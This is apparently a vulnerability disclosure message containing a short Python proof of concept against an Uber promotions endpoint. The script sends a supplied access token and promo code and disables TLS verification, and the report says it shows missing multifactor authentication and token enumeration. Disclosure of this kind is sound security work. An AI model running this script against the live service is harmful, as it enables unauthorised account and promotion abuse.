activities.message:
Python POC, to demonstrate the lack of multifactor authentication and ability to enumerate access tokens with a valid promo code:

```
#!/usr/bin/python

import sys, getopt, requests

def main(argv):
   token = ''
   code = ''
   try:
      opts, args = getopt.getopt(argv,"ht:c:",["token=","code="])
   except getopt.GetoptError:
      print 'promo.py -t <access token> -c <promo code>'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'promo.py -t <access token> -c <promo code>'
         sys.exit()
      elif opt in ("-t", "--token"):
         token = arg
      elif opt in ("-c", "--code"):
         code = arg
   requests.packages.urllib3.disable_warnings()
   response = requests.post(
      'https://cn-sjc1.uber.com/rt/users/apply-clients-promotions',
       headers={                                                                    
                                                                           'x-uber-token': token},
    json={'code': code}, verify=False
)

   print(response.text)

if __name__ == "__main__":
   main(sys.argv[1:])
```
